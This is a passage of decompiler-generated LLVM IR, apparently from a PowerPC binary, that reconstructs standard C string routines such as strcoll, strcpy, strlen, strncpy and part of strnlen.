  %v3_1000a094 = icmp eq i8 %v3_1000a08c, 0
  br i1 %v3_1000a094, label %dec_label_pc_1000a0e0, label %dec_label_pc_1000a0a8

dec_label_pc_1000a0a8:                            ; preds = %dec_label_pc_1000a0a4
  %v2_1000a0a8 = inttoptr i32 %v1_1000a06c to i8*
  %v3_1000a0a8 = load i8, i8* %v2_1000a0a8, align 1
  %v4_1000a0a8 = zext i8 %v3_1000a0a8 to i32
  %v4_1000a0ac = icmp eq i32 %v4_1000a0a8, %v0_1000a010
  br i1 %v4_1000a0ac, label %dec_label_pc_1000a0b8, label %dec_label_pc_1000a0c0

dec_label_pc_1000a0b8:                            ; preds = %dec_label_pc_1000a0a8
  ret i32 %v1_1000a06c

dec_label_pc_1000a0c0:                            ; preds = %dec_label_pc_1000a0a8
  %v3_1000a0b0 = icmp eq i8 %v3_1000a0a8, 0
  br i1 %v3_1000a0b0, label %dec_label_pc_1000a0e0, label %dec_label_pc_1000a0c4

dec_label_pc_1000a0c4:                            ; preds = %dec_label_pc_1000a0c0
  %v2_1000a0c4 = inttoptr i32 %v1_1000a070 to i8*
  %v3_1000a0c4 = load i8, i8* %v2_1000a0c4, align 1
  %v4_1000a0c4 = zext i8 %v3_1000a0c4 to i32
  %v4_1000a0c8 = icmp eq i32 %v4_1000a0c4, %v0_1000a010
  br i1 %v4_1000a0c8, label %dec_label_pc_1000a0d4, label %dec_label_pc_1000a0dc

dec_label_pc_1000a0d4:                            ; preds = %dec_label_pc_1000a0c4
  ret i32 %v1_1000a070

dec_label_pc_1000a0dc:                            ; preds = %dec_label_pc_1000a0c4
  %v3_1000a0cc = icmp eq i8 %v3_1000a0c4, 0
  br i1 %v3_1000a0cc, label %dec_label_pc_1000a0e0, label %dec_label_pc_1000a028

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_10009ff0, %dec_label_pc_1000a0dc, %dec_label_pc_1000a0c0, %dec_label_pc_1000a0a4, %dec_label_pc_1000a088
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000a02c, { 1, 0 }
  uselistorder i32 %v2_1000a028, { 0, 2, 1 }
  uselistorder i32 %v0_1000a080, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000a018, { 1, 0 }
  uselistorder i32 %v0_1000a010, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000a004, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000a0082, { 2, 1, 0 }
  uselistorder i32 %v1_10009fe8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a0e0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000a028, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009ff0, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000a0f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000a0ec

dec_label_pc_1000a0ec:                            ; preds = %dec_label_pc_1000a110, %entry
  %v0_1000a0f4 = phi i32 [ %v1_1000a0f8, %dec_label_pc_1000a110 ], [ %v0_1000a0f4.pre, %entry ]
  %v0_1000a0ec = phi i32 [ %v1_1000a0f0, %dec_label_pc_1000a110 ], [ %tmp, %entry ]
  %v1_1000a0ec = inttoptr i32 %v0_1000a0ec to i8*
  %v2_1000a0ec = load i8, i8* %v1_1000a0ec, align 1
  %v3_1000a0ec = zext i8 %v2_1000a0ec to i32
  %v1_1000a0f4 = inttoptr i32 %v0_1000a0f4 to i8*
  %v2_1000a0f4 = load i8, i8* %v1_1000a0f4, align 1
  %v3_1000a0f4 = zext i8 %v2_1000a0f4 to i32
  %v3_1000a0fc = icmp eq i8 %v2_1000a0ec, 0
  br i1 %v3_1000a0fc, label %dec_label_pc_1000a108, label %dec_label_pc_1000a110

dec_label_pc_1000a108:                            ; preds = %dec_label_pc_1000a0ec
  %v1_1000a108 = sub nsw i32 0, %v3_1000a0f4
  ret i32 %v1_1000a108

dec_label_pc_1000a110:                            ; preds = %dec_label_pc_1000a0ec
  %v4_1000a100 = icmp eq i8 %v2_1000a0ec, %v2_1000a0f4
  %v1_1000a0f8 = add i32 %v0_1000a0f4, 1
  %v1_1000a0f0 = add i32 %v0_1000a0ec, 1
  br i1 %v4_1000a100, label %dec_label_pc_1000a0ec, label %dec_label_pc_1000a114

dec_label_pc_1000a114:                            ; preds = %dec_label_pc_1000a110
  %v2_1000a114 = sub nsw i32 %v3_1000a0ec, %v3_1000a0f4
  ret i32 %v2_1000a114

; uselistorder directives
  uselistorder i32 %v3_1000a0f4, { 1, 0 }
  uselistorder i32 %v0_1000a0ec, { 1, 0 }
  uselistorder i32 %v0_1000a0f4, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000a11c = add i32 %arg1, -1
  %v1_1000a120 = sub i32 %v2_1000a11c, %tmp
  store i32 %v1_1000a120, i32* %r9.global-to-local, align 4
  %v2_1000a1244 = load i8, i8* %arg2, align 1
  %v1_1000a1286 = add i32 %tmp, 1
  store i32 %v1_1000a1286, i32* %r4.global-to-local, align 4
  %v3_1000a12c8 = icmp eq i8 %v2_1000a1244, 0
  store i1 %v3_1000a12c8, i1* %cr7_eq.global-to-local, align 1
  %v5_1000a1309 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000a1244, i8* %v5_1000a1309, align 1
  %v0_1000a13410 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a13410, label %dec_label_pc_1000a138, label %dec_label_pc_1000a124.dec_label_pc_1000a124_crit_edge

dec_label_pc_1000a124.dec_label_pc_1000a124_crit_edge: ; preds = %entry, %dec_label_pc_1000a124.dec_label_pc_1000a124_crit_edge
  %v0_1000a124.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000a130.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a124 = inttoptr i32 %v0_1000a124.pre to i8*
  %v2_1000a124 = load i8, i8* %v1_1000a124, align 1
  %v1_1000a128 = add i32 %v0_1000a124.pre, 1
  store i32 %v1_1000a128, i32* %r4.global-to-local, align 4
  %v3_1000a12c = icmp eq i8 %v2_1000a124, 0
  store i1 %v3_1000a12c, i1* %cr7_eq.global-to-local, align 1
  %v4_1000a130 = add i32 %v1_1000a128, %v2_1000a130.pre
  %v5_1000a130 = inttoptr i32 %v4_1000a130 to i8*
  store i8 %v2_1000a124, i8* %v5_1000a130, align 1
  %v0_1000a134 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a134, label %dec_label_pc_1000a138, label %dec_label_pc_1000a124.dec_label_pc_1000a124_crit_edge

dec_label_pc_1000a138:                            ; preds = %dec_label_pc_1000a124.dec_label_pc_1000a124_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a124.dec_label_pc_1000a124_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000a13c = load i32, i32* @r3, align 4
  %v1_1000a1543 = urem i32 %v0_1000a13c, 4
  %v3_1000a1545 = icmp eq i32 %v1_1000a1543, 0
  br i1 %v3_1000a1545, label %dec_label_pc_1000a15c, label %dec_label_pc_1000a144

dec_label_pc_1000a144:                            ; preds = %entry, %dec_label_pc_1000a150
  %v0_1000a150 = phi i32 [ %v1_1000a150, %dec_label_pc_1000a150 ], [ %v0_1000a13c, %entry ]
  %v1_1000a144 = inttoptr i32 %v0_1000a150 to i8*
  %v2_1000a144 = load i8, i8* %v1_1000a144, align 1
  %v3_1000a148 = icmp eq i8 %v2_1000a144, 0
  br i1 %v3_1000a148, label %dec_label_pc_1000a190, label %dec_label_pc_1000a150

dec_label_pc_1000a150:                            ; preds = %dec_label_pc_1000a144
  %v1_1000a150 = add i32 %v0_1000a150, 1
  %v1_1000a154 = urem i32 %v1_1000a150, 4
  %v3_1000a154 = icmp eq i32 %v1_1000a154, 0
  br i1 %v3_1000a154, label %dec_label_pc_1000a15c, label %dec_label_pc_1000a144

dec_label_pc_1000a15c:                            ; preds = %dec_label_pc_1000a150, %entry
  %v0_1000a160 = phi i32 [ %v0_1000a13c, %entry ], [ %v1_1000a150, %dec_label_pc_1000a150 ]
  br label %dec_label_pc_1000a168

dec_label_pc_1000a168:                            ; preds = %dec_label_pc_1000a1c8, %dec_label_pc_1000a168, %dec_label_pc_1000a15c
  %v1_1000a1a4 = phi i32 [ %v0_1000a160, %dec_label_pc_1000a15c ], [ %v1_1000a16c, %dec_label_pc_1000a168 ], [ %v1_1000a16c, %dec_label_pc_1000a1c8 ]
  %v1_1000a168 = inttoptr i32 %v1_1000a1a4 to i32*
  %v2_1000a168 = load i32, i32* %v1_1000a168, align 4
  %v1_1000a16c = add i32 %v1_1000a1a4, 4
  %v1_1000a178 = add i32 %v2_1000a168, -16843009
  %v2_1000a17c = and i32 %v1_1000a178, -2139062144
  %v5_1000a17c = icmp eq i32 %v2_1000a17c, 0
  br i1 %v5_1000a17c, label %dec_label_pc_1000a168, label %dec_label_pc_1000a184

dec_label_pc_1000a184:                            ; preds = %dec_label_pc_1000a168
  %v2_1000a184 = inttoptr i32 %v1_1000a1a4 to i8*
  %v3_1000a184 = load i8, i8* %v2_1000a184, align 1
  %v3_1000a188 = icmp eq i8 %v3_1000a184, 0
  br i1 %v3_1000a188, label %dec_label_pc_1000a190, label %dec_label_pc_1000a198

dec_label_pc_1000a190:                            ; preds = %dec_label_pc_1000a144, %dec_label_pc_1000a184
  %v1_1000a190 = phi i32 [ %v1_1000a1a4, %dec_label_pc_1000a184 ], [ %v0_1000a150, %dec_label_pc_1000a144 ]
  %v2_1000a190 = sub i32 %v1_1000a190, %v0_1000a13c
  ret i32 %v2_1000a190

dec_label_pc_1000a198:                            ; preds = %dec_label_pc_1000a184
  %v1_1000a198 = add i32 %v1_1000a1a4, 1
  %v2_1000a198 = inttoptr i32 %v1_1000a198 to i8*
  %v3_1000a198 = load i8, i8* %v2_1000a198, align 1
  %v3_1000a19c = icmp eq i8 %v3_1000a198, 0
  br i1 %v3_1000a19c, label %dec_label_pc_1000a1a4, label %dec_label_pc_1000a1b0

dec_label_pc_1000a1a4:                            ; preds = %dec_label_pc_1000a198
  %v2_1000a1a4 = sub i32 %v1_1000a1a4, %v0_1000a13c
  %v1_1000a1a8 = add i32 %v2_1000a1a4, 1
  ret i32 %v1_1000a1a8

dec_label_pc_1000a1b0:                            ; preds = %dec_label_pc_1000a198
  %v1_1000a1b0 = add i32 %v1_1000a1a4, 2
  %v2_1000a1b0 = inttoptr i32 %v1_1000a1b0 to i8*
  %v3_1000a1b0 = load i8, i8* %v2_1000a1b0, align 1
  %v3_1000a1b4 = icmp eq i8 %v3_1000a1b0, 0
  br i1 %v3_1000a1b4, label %dec_label_pc_1000a1bc, label %dec_label_pc_1000a1c8

dec_label_pc_1000a1bc:                            ; preds = %dec_label_pc_1000a1b0
  %v2_1000a1bc = sub i32 %v1_1000a1a4, %v0_1000a13c
  %v1_1000a1c0 = add i32 %v2_1000a1bc, 2
  ret i32 %v1_1000a1c0

dec_label_pc_1000a1c8:                            ; preds = %dec_label_pc_1000a1b0
  %v1_1000a1c8 = add i32 %v1_1000a1a4, 3
  %v2_1000a1c8 = inttoptr i32 %v1_1000a1c8 to i8*
  %v3_1000a1c8 = load i8, i8* %v2_1000a1c8, align 1
  %v3_1000a1cc = icmp eq i8 %v3_1000a1c8, 0
  br i1 %v3_1000a1cc, label %dec_label_pc_1000a1d4, label %dec_label_pc_1000a168

dec_label_pc_1000a1d4:                            ; preds = %dec_label_pc_1000a1c8
  %v2_1000a1d4 = sub i32 %v1_1000a1a4, %v0_1000a13c
  %v1_1000a1d8 = add i32 %v2_1000a1d4, 3
  ret i32 %v1_1000a1d8

; uselistorder directives
  uselistorder i32 %v1_1000a16c, { 1, 0 }
  uselistorder i32 %v1_1000a1a4, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000a150, { 1, 0, 2 }
  uselistorder i32 %v0_1000a13c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a190, { 1, 0 }
  uselistorder label %dec_label_pc_1000a144, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000a1e0 = icmp eq i32 %arg2, 3
  store i1 %v3_1000a1e0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a1e4 = add i32 %arg1, -1
  store i32 %v1_1000a1e4, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000a260, label %dec_label_pc_1000a1ec

dec_label_pc_1000a1ec:                            ; preds = %entry
  %v1_1000a1ec = udiv i32 %arg2, 4
  store i32 %v1_1000a1ec, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a1f4

dec_label_pc_1000a1f4:                            ; preds = %dec_label_pc_1000a244, %dec_label_pc_1000a1ec
  %v2_1000a204 = phi i32 [ %v3_1000a23c, %dec_label_pc_1000a244 ], [ %v1_1000a1e4, %dec_label_pc_1000a1ec ]
  %v0_1000a1f4 = load i32, i32* @r4, align 4
  %v1_1000a1f4 = inttoptr i32 %v0_1000a1f4 to i8*
  %v2_1000a1f4 = load i8, i8* %v1_1000a1f4, align 1
  %v1_1000a1f8 = add i32 %v0_1000a1f4, 1
  store i32 %v1_1000a1f8, i32* %r10.global-to-local, align 4
  %v1_1000a1fc = add i32 %v0_1000a1f4, 2
  store i32 %v1_1000a1fc, i32* %r8.global-to-local, align 4
  %v3_1000a200 = icmp eq i8 %v2_1000a1f4, 0
  store i1 %v3_1000a200, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a204 = add i32 %v2_1000a204, 1
  %v4_1000a204 = inttoptr i32 %v3_1000a204 to i8*
  store i8 %v2_1000a1f4, i8* %v4_1000a204, align 1
  store i32 %v3_1000a204, i32* %r11.global-to-local, align 4
  %v0_1000a208 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a208 = add i32 %v0_1000a208, 1
  store i32 %v1_1000a208, i32* %r9.global-to-local, align 4
  %v0_1000a20c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a20c, label %dec_label_pc_1000a24c, label %dec_label_pc_1000a210

dec_label_pc_1000a210:                            ; preds = %dec_label_pc_1000a1f4
  %v0_1000a210 = load i32, i32* @r4, align 4
  %v1_1000a210 = add i32 %v0_1000a210, 1
  %v2_1000a210 = inttoptr i32 %v1_1000a210 to i8*
  %v3_1000a210 = load i8, i8* %v2_1000a210, align 1
  %v1_1000a214 = add i32 %v0_1000a208, 2
  store i32 %v1_1000a214, i32* @r4, align 4
  %v3_1000a218 = icmp eq i8 %v3_1000a210, 0
  store i1 %v3_1000a218, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a21c = add i32 %v2_1000a204, 2
  %v4_1000a21c = inttoptr i32 %v3_1000a21c to i8*
  store i8 %v3_1000a210, i8* %v4_1000a21c, align 1
  store i32 %v3_1000a21c, i32* %r11.global-to-local, align 4
  %v0_1000a220 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a220, label %dec_label_pc_1000a24c, label %dec_label_pc_1000a224

dec_label_pc_1000a224:                            ; preds = %dec_label_pc_1000a210
  %v0_1000a224 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a224 = add i32 %v0_1000a224, 1
  %v2_1000a224 = inttoptr i32 %v1_1000a224 to i8*
  %v3_1000a224 = load i8, i8* %v2_1000a224, align 1
  %v3_1000a228 = icmp eq i8 %v3_1000a224, 0
  store i1 %v3_1000a228, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a22c = add i32 %v2_1000a204, 3
  %v4_1000a22c = inttoptr i32 %v3_1000a22c to i8*
  store i8 %v3_1000a224, i8* %v4_1000a22c, align 1
  store i32 %v3_1000a22c, i32* %r11.global-to-local, align 4
  %v0_1000a230 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a230, label %dec_label_pc_1000a24c, label %dec_label_pc_1000a234

dec_label_pc_1000a234:                            ; preds = %dec_label_pc_1000a224
  %v0_1000a234 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a234 = add i32 %v0_1000a234, 1
  %v2_1000a234 = inttoptr i32 %v1_1000a234 to i8*
  %v3_1000a234 = load i8, i8* %v2_1000a234, align 1
  %v3_1000a238 = icmp eq i8 %v3_1000a234, 0
  store i1 %v3_1000a238, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a23c = add i32 %v2_1000a204, 4
  %v4_1000a23c = inttoptr i32 %v3_1000a23c to i8*
  store i8 %v3_1000a234, i8* %v4_1000a23c, align 1
  store i32 %v3_1000a23c, i32* %r11.global-to-local, align 4
  %v0_1000a240 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a240, label %dec_label_pc_1000a24c, label %dec_label_pc_1000a244

dec_label_pc_1000a244:                            ; preds = %dec_label_pc_1000a234
  %v0_1000a244 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a244 = add i32 %v0_1000a244, -1
  store i32 %v1_1000a244, i32* %ctr.global-to-local, align 4
  %v2_1000a244 = icmp eq i32 %v1_1000a244, 0
  br i1 %v2_1000a244, label %dec_label_pc_1000a260, label %dec_label_pc_1000a1f4

dec_label_pc_1000a24c:                            ; preds = %dec_label_pc_1000a234, %dec_label_pc_1000a224, %dec_label_pc_1000a210, %dec_label_pc_1000a1f4
  %v1_1000a24c = phi i32 [ %v3_1000a23c, %dec_label_pc_1000a234 ], [ %v3_1000a22c, %dec_label_pc_1000a224 ], [ %v3_1000a21c, %dec_label_pc_1000a210 ], [ %v3_1000a204, %dec_label_pc_1000a1f4 ]
  %v2_1000a24c11 = sub i32 %arg1, %v1_1000a24c
  %v2_1000a250 = add i32 %v2_1000a24c11, %arg2
  %v1_1000a254 = add i32 %v2_1000a250, -1
  store i32 %v1_1000a254, i32* %r9.global-to-local, align 4
  %v4_1000a254 = icmp eq i32 %v1_1000a254, 0
  %v0_1000a258 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a254, i32 %v0_1000a258)
  %v2_1000a290.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a288

dec_label_pc_1000a260:                            ; preds = %dec_label_pc_1000a244, %entry
  %v1_1000a260 = urem i32 %arg2, 4
  store i32 %v1_1000a260, i32* %r9.global-to-local, align 4
  %v3_1000a260 = icmp eq i32 %v1_1000a260, 0
  %v0_1000a264 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a260, i32 %v0_1000a264)
  store i32 %v1_1000a260, i32* %ctr.global-to-local, align 4
  %v2_1000a27c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a26c

dec_label_pc_1000a26c:                            ; preds = %dec_label_pc_1000a284.dec_label_pc_1000a26c_crit_edge, %dec_label_pc_1000a260
  %v2_1000a27c = phi i32 [ %v3_1000a27c, %dec_label_pc_1000a284.dec_label_pc_1000a26c_crit_edge ], [ %v2_1000a27c.pre, %dec_label_pc_1000a260 ]
  %v0_1000a270 = phi i32 [ %v0_1000a270.pre, %dec_label_pc_1000a284.dec_label_pc_1000a26c_crit_edge ], [ %v1_1000a260, %dec_label_pc_1000a260 ]
  %v0_1000a26c = load i32, i32* @r4, align 4
  %v1_1000a26c = inttoptr i32 %v0_1000a26c to i8*
  %v2_1000a26c = load i8, i8* %v1_1000a26c, align 1
  %v1_1000a270 = add i32 %v0_1000a270, -1
  store i32 %v1_1000a270, i32* %r9.global-to-local, align 4
  %v1_1000a274 = add i32 %v0_1000a26c, 1
  store i32 %v1_1000a274, i32* @r4, align 4
  %v3_1000a278 = icmp eq i8 %v2_1000a26c, 0
  store i1 %v3_1000a278, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a27c = add i32 %v2_1000a27c, 1
  %v4_1000a27c = inttoptr i32 %v3_1000a27c to i8*
  store i8 %v2_1000a26c, i8* %v4_1000a27c, align 1
  store i32 %v3_1000a27c, i32* %r11.global-to-local, align 4
  %v0_1000a280 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a280 = add i32 %v0_1000a280, -1
  store i32 %v1_1000a280, i32* %ctr.global-to-local, align 4
  %v2_1000a280 = icmp eq i32 %v1_1000a280, 0
  br i1 %v2_1000a280, label %dec_label_pc_1000a298, label %dec_label_pc_1000a284

dec_label_pc_1000a284:                            ; preds = %dec_label_pc_1000a26c
  %v0_1000a284 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a284, label %dec_label_pc_1000a288, label %dec_label_pc_1000a284.dec_label_pc_1000a26c_crit_edge

dec_label_pc_1000a284.dec_label_pc_1000a26c_crit_edge: ; preds = %dec_label_pc_1000a284
  %v0_1000a270.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a26c

dec_label_pc_1000a288:                            ; preds = %dec_label_pc_1000a284, %dec_label_pc_1000a24c
  %v2_1000a290.pre = phi i32 [ %v2_1000a290.pre.pre, %dec_label_pc_1000a24c ], [ %v3_1000a27c, %dec_label_pc_1000a284 ]
  %v0_1000a288 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000a288, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a28c

dec_label_pc_1000a28c:                            ; preds = %dec_label_pc_1000a28c, %dec_label_pc_1000a288
  %v2_1000a290 = phi i32 [ %v3_1000a290, %dec_label_pc_1000a28c ], [ %v2_1000a290.pre, %dec_label_pc_1000a288 ]
  %v3_1000a290 = add i32 %v2_1000a290, 1
  %v4_1000a290 = inttoptr i32 %v3_1000a290 to i8*
  store i8 0, i8* %v4_1000a290, align 1
  store i32 %v3_1000a290, i32* %r11.global-to-local, align 4
  %v0_1000a294 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a294 = add i32 %v0_1000a294, -1
  store i32 %v1_1000a294, i32* %ctr.global-to-local, align 4
  %v2_1000a294 = icmp eq i32 %v1_1000a294, 0
  br i1 %v2_1000a294, label %dec_label_pc_1000a298, label %dec_label_pc_1000a28c

dec_label_pc_1000a298:                            ; preds = %dec_label_pc_1000a26c, %dec_label_pc_1000a28c
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000a294, { 1, 0 }
  uselistorder i32 %v3_1000a290, { 1, 2, 0 }
  uselistorder i32 %v1_1000a280, { 1, 0 }
  uselistorder i32 %v3_1000a27c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000a260, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000a244, { 1, 0 }
  uselistorder i32 %v3_1000a23c, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a298, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000a29c = load i32, i32* @r4, align 4
  %v3_1000a29c = icmp eq i32 %v0_1000a29c, 0
  %v0_1000a2a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a29c, i32 %v0_1000a2a8)
  %v1_1000a2b8 = load i32, i32* @r4, align 4
  %v2_1000a2b8 = add i32 %v1_1000a2b8, %tmp
  %v3_1000a2bc = icmp ugt i32 %v2_1000a2b8, %tmp
  %v4_1000a2bc = icmp eq i32 %v1_1000a2b8, 0
  %v2_1000a2c0 = or i1 %v4_1000a2bc, %v3_1000a2bc
  br i1 %v2_1000a2c0, label %dec_label_pc_1000a2c8, label %dec_label_pc_1000a2c4

dec_label_pc_1000a2b0:                            ; preds = %dec_label_pc_1000a330
  br label %dec_label_pc_1000a374

dec_label_pc_1000a2c4:                            ; preds = %entry
  br label %dec_label_pc_1000a2c8

dec_label_pc_1000a2c8:                            ; preds = %entry, %dec_label_pc_1000a2c4
  %v0_1000a378 = phi i32 [ %v2_1000a2b8, %entry ], [ -1, %dec_label_pc_1000a2c4 ]
  %v1_1000a2f86 = urem i32 %tmp, 4
  %v3_1000a2f88 = icmp eq i32 %v1_1000a2f86, 0
  br i1 %v3_1000a2f88, label %dec_label_pc_1000a300, label %dec_label_pc_1000a2d0

dec_label_pc_1000a2d0:                            ; preds = %dec_label_pc_1000a2c8, %dec_label_pc_1000a2f4
  %v0_1000a2e8 = phi i32 [ %v1_1000a2f4, %dec_label_pc_1000a2f4 ], [ %tmp, %dec_label_pc_1000a2c8 ]
  %v1_1000a2d0 = inttoptr i32 %v0_1000a2e8 to i8*
  %v2_1000a2d0 = load i8, i8* %v1_1000a2d0, align 1
  %v3_1000a2d4 = icmp eq i8 %v2_1000a2d0, 0
  br i1 %v3_1000a2d4, label %dec_label_pc_1000a2dc, label %dec_label_pc_1000a2f4

dec_label_pc_1000a2dc:                            ; preds = %dec_label_pc_1000a2d0
  %v3_1000a2dc = icmp ugt i32 %v0_1000a378, %v0_1000a2e8
  %v0_1000a2e8.v0_1000a378 = select i1 %v3_1000a2dc, i32 %v0_1000a2e8, i32 %v0_1000a378
  %v2_1000a2ec = sub i32 %v0_1000a2e8.v0_1000a378, %tmp
  ret i32 %v2_1000a2ec

dec_label_pc_1000a2f4:                            ; preds = %dec_label_pc_1000a2d0
  %v1_1000a2f4 = add i32 %v0_1000a2e8, 1
  %v1_1000a2f8 = urem i32 %v1_1000a2f4, 4
  %v3_1000a2f8 = icmp eq i32 %v1_1000a2f8, 0
  br i1 %v3_1000a2f8, label %dec_label_pc_1000a300, label %dec_label_pc_1000a2d0

dec_label_pc_1000a300:                            ; preds = %dec_label_pc_1000a2f4, %dec_label_pc_1000a2c8
  %v0_1000a304 = phi i32 [ %tmp, %dec_label_pc_1000a2c8 ], [ %v1_1000a2f4, %dec_label_pc_1000a2f4 ]
  %v2_1000a36c3 = icmp ult i32 %v0_1000a304, %v0_1000a378
  br i1 %v2_1000a36c3, label %dec_label_pc_1000a310, label %dec_label_pc_1000a374

dec_label_pc_1000a310:                            ; preds = %dec_label_pc_1000a300, %dec_label_pc_1000a368
  %v0_1000a2b0 = phi i32 [ %v1_1000a314, %dec_label_pc_1000a368 ], [ %v0_1000a304, %dec_label_pc_1000a300 ]
  %v1_1000a310 = inttoptr i32 %v0_1000a2b0 to i32*
  %v2_1000a310 = load i32, i32* %v1_1000a310, align 4
  %v1_1000a314 = add i32 %v0_1000a2b0, 4
  %v1_1000a320 = add i32 %v2_1000a310, -16843009
  %v2_1000a324 = and i32 %v1_1000a320, -2139062144
  %v5_1000a324 = icmp eq i32 %v2_1000a324, 0
  %v1_1000a328 = add i32 %v0_1000a2b0, 1
  br i1 %v5_1000a324, label %dec_label_pc_1000a368, label %dec_label_pc_1000a330

dec_label_pc_1000a330:                            ; preds = %dec_label_pc_1000a310
  %v2_1000a330 = inttoptr i32 %v0_1000a2b0 to i8*
  %v3_1000a330 = load i8, i8* %v2_1000a330, align 1
  %v3_1000a334 = icmp eq i8 %v3_1000a330, 0
  br i1 %v3_1000a334, label %dec_label_pc_1000a2b0, label %dec_label_pc_1000a33c

dec_label_pc_1000a33c:                            ; preds = %dec_label_pc_1000a330
  %v2_1000a33c = inttoptr i32 %v1_1000a328 to i8*
  %v3_1000a33c = load i8, i8* %v2_1000a33c, align 1
  %v3_1000a340 = icmp eq i8 %v3_1000a33c, 0
  br i1 %v3_1000a340, label %dec_label_pc_1000a374, label %dec_label_pc_1000a348

dec_label_pc_1000a348:                            ; preds = %dec_label_pc_1000a33c
  %v1_1000a348 = add i32 %v0_1000a2b0, 2
  %v2_1000a348 = inttoptr i32 %v1_1000a348 to i8*
  %v3_1000a348 = load i8, i8* %v2_1000a348, align 1
  %v3_1000a350 = icmp eq i8 %v3_1000a348, 0
  br i1 %v3_1000a350, label %dec_label_pc_1000a374, label %dec_label_pc_1000a358

dec_label_pc_1000a358:                            ; preds = %dec_label_pc_1000a348
  %v1_1000a358 = add i32 %v0_1000a2b0, 3
  %v2_1000a358 = inttoptr i32 %v1_1000a358 to i8*
  %v3_1000a358 = load i8, i8* %v2_1000a358, align 1
  %v3_1000a360 = icmp eq i8 %v3_1000a358, 0
  br i1 %v3_1000a360, label %dec_label_pc_1000a374, label %dec_label_pc_1000a368

dec_label_pc_1000a368:                            ; preds = %dec_label_pc_1000a358, %dec_label_pc_1000a310
  %v2_1000a36c = icmp ult i32 %v1_1000a314, %v0_1000a378
  br i1 %v2_1000a36c, label %dec_label_pc_1000a310, label %dec_label_pc_1000a374

